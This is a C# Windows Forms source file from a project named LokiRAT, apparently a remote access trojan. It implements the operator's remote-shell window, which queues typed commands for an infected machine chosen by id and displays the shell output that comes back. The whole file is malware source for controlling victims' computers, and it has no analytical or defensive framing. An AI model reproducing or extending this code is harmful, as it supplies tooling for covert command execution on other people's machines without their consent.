using System;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace LokiRAT
{
    public partial class shellexec : Form
    {
        string id;
        string myLastCommand = "-1";

        public shellexec(string id)
        {
            InitializeComponent();
            this.id = id;
        }

        private void Shellexec_Load(object sender, EventArgs e)
        {

        }

        private void TextBox1_TextChanged(object sender, EventArgs e)
        {
            NativeMethodsHelper.ScrollToBottom(textBox1.Handle);
        }

        private void ComboBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(comboBox1.Text.Trim()))
            {
                string input = comboBox1.Text;
                comboBox1.Text = string.Empty;

                if (input == "exit")
                    this.Close();
                else
                {
                    textBox1.AppendText("->" + input + "\r\n");
                    Global.AddCommandToList(id, "shellexec|" + input);
                    comboBox1.Items.Add(input);
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Global.lastCommand[id] != this.myLastCommand)
                {
                    this.myLastCommand = Global.lastCommand[id];
                    string[] rets = Regex.Split(Global.GetLastCommandText(id), "{-}");
                    if (rets[0] == "LSshellexec")
                    {
                        textBox1.AppendText(rets[1]);
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }
    }
}